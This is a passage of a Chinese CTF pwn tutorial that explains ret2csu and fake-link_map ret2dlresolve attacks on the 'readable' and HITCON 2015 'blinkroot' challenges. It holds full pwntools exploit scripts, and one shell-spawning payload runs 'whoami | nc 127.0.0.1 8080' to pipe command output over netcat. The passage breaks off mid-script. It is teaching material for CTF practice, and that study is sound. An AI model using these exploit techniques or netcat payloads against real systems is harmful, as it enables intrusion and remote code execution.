        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># modify read's got</span>
        payload <span class="token operator">=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># jump to read again</span>
        <span class="token comment" spellcheck="true"># try to write ELF Header to stdout</span>
        payload <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x400000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># gdb.attach(io)</span>
        <span class="token comment" spellcheck="true"># pause()</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            tmp <span class="token operator">=</span> read16bytes<span class="token punctuation">(</span>rop_addr<span class="token operator">+</span>j<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>j<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># jump to the rop</span>
        payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr<span class="token number">-8</span><span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400520</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># leave ret</span>

        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"\x7FELF"</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下</p>
<pre class="line-numbers language-bash"><code class="language-bash">❯ python exp.py
<span class="token punctuation">(</span><span class="token string">'0x8f'</span>, <span class="token string">'\x7fELF'</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token string">'0xc2'</span>, <span class="token string">'\x7fELF'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>通过对比 libc.so 确实可以看到，对应的偏移处具有 <code>syscall</code> 指令</p>
<pre><code>.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read</code></pre><p>libc 的版本为</p>
<pre><code>❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.</code></pre><p>需要注意，不同 libc 的偏移可能不一样。</p>
<p>完整代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'error'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
csu_first_addr <span class="token operator">=</span> <span class="token number">0x40058A</span>
csu_second_addr <span class="token operator">=</span> <span class="token number">0x400570</span>


<span class="token keyword">def</span> <span class="token function">read16bytes</span><span class="token punctuation">(</span>targetaddr<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>targetaddr<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400505</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> content<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x600f00</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400505</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">csu_gadget</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># rdx = r13</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdi = r15d</span>
    <span class="token comment" spellcheck="true"># call [r12+rbx*8]</span>
    <span class="token comment" spellcheck="true"># set rbx+1=rbp</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>csu_first_addr<span class="token punctuation">,</span> rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span>
                    r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> csu_second_addr<span class="token punctuation">]</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rop_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># modify read's got</span>
        payload <span class="token operator">=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># jump to read again</span>
        <span class="token comment" spellcheck="true"># try to write ELF Header to stdout</span>
        payload <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x400000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># gdb.attach(io)</span>
        <span class="token comment" spellcheck="true"># pause()</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            tmp <span class="token operator">=</span> read16bytes<span class="token punctuation">(</span>rop_addr<span class="token operator">+</span>j<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>j<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># jump to the rop</span>
        payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr<span class="token number">-8</span><span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400520</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># leave ret</span>

        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"\x7FELF"</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rop_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
    execve_number <span class="token operator">=</span> <span class="token number">59</span>
    bin_sh_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token operator">-</span>execve_number<span class="token operator">+</span><span class="token number">1</span>
    <span class="token comment" spellcheck="true"># modify the last byte of read's got</span>
    payload <span class="token operator">=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> execve_number<span class="token punctuation">,</span> bin_sh_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># jump to read again, execve("/bin/sh\x00")</span>
    payload <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                          bin_sh_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> bin_sh_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> bin_sh_addr<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> read16bytes<span class="token punctuation">(</span>rop_addr<span class="token operator">+</span>j<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>j<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># jump to the rop</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr<span class="token number">-8</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400520</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># leave ret</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>execve_number<span class="token number">-1</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xc2</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># bruteforce()</span>
    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2015-hitcon-quals-blinkroot"><a href="#2015-hitcon-quals-blinkroot" class="headerlink" title="2015-hitcon-quals-blinkroot"></a>2015-hitcon-quals-blinkroot</h2><p>简单看一下程序开的保护</p>
<pre class="line-numbers language-bash"><code class="language-bash">❯ checksec blinkroot
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现程序开启了 Canary 保护。</p>
<p>程序的基本逻辑为</p>
<ul>
<li>在 bss 指定位置处读取 1024 个字节</li>
<li>关闭标准输入，标准输出，标准错误输出。</li>
<li>然后可以在任意 16 字节对齐地址处设置16个字节，其中低8字节固定为 0x10，高 8 字节完全可控。</li>
</ul>
<p>显然这里是没有信息泄露的，当然我们没有办法覆盖返回地址来控制程序的执行流。但是既然程序没有开启 RELRO 保护，我们可以考虑修改 ELF 文件的字符串表。同时我们观察到</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">recvlen</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>__m128 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data <span class="token operator">+</span> data<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_mm_loadh_ps</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dbl_600BC8<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序会执行 puts 函数，而 puts 函数的具体地址为 data 变量偏移 0x10。</p>
<pre><code>.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends</code></pre><p>因此，我们可以控制 s 为 /bin/sh，同时控制字符串表中的 puts 函数为 system 函数，那就可以调用 system 函数了。然而，理想很好，但是，我们发现</p>
<pre><code>LOAD:00000000006009E8                 Elf64_Dyn &lt;5, 400340h&gt;  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn &lt;6, 400280h&gt;  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn &lt;0Ah, 69h&gt;    ; DT_STRSZ</code></pre><p>字符串表并不是 16 字节对齐的，因此不太行。那我们尝试使用在开启 Partial RELRO 下的思路吧。</p>
<p>由于不能泄露地址信息，所以我们可以采用伪造 linkmap 的思路，即</p>
<ul>
<li>利用题目提供的任意写的思路修改 linkmap 指向已经解析的地址</li>
<li>通过题目中接下来将要调用的 puts 函数来实现劫持控制流的目的</li>
</ul>
<p>这里我们可以发现 linkmap 存储的地址为 0x600B48，因此我们可以从 0x600B40 开始设置数据。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>此外，需要注意的是 puts 函数在重定位表中的索引为 1。因此，在构造 linkmap 时需要注意。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用脚本如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"blinkroot"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"blinkroot"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ret2dlresolve_with_fakelinkmap_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> fake_linkmap_addr<span class="token punctuation">,</span> known_function_ptr<span class="token punctuation">,</span> offset_of_two_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3

    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: padding for the relocation entry of idx=0
        0x20: padding for the relocation entry of idx=0
        0x28: padding for the relocation entry of idx=0
        0x30: p_r_offset, offset pointer to the resloved addr
        0x38: r_info
        0x40: append    
      resolved addr
        0x48: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
        0x50: 6, tag of the DT_SYMTAB
        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x50
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset_of_two_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    <span class="token comment" spellcheck="true"># here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset</span>
    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x48</span> <span class="token operator">-</span> offset_of_two_addr<span class="token punctuation">)</span>
                   <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>known_function_ptr<span class="token number">-8</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> linkmap

<span class="token comment" spellcheck="true"># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class="token comment" spellcheck="true"># .got.plt:0000000000600B48 qword_600B48    dq 0    </span>
target_addr <span class="token operator">=</span> <span class="token number">0x600B40</span>
data_addr <span class="token operator">=</span> <span class="token number">0x600BC0</span>
offset <span class="token operator">=</span> target_addr<span class="token operator">-</span>data_addr
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>data_addr<span class="token operator">+</span><span class="token number">43</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">"whoami | nc 127.0.0.1 8080\x00"</span>

payload <span class="token operator">+=</span>ret2dlresolve_with_fakelinkmap_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>data_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>
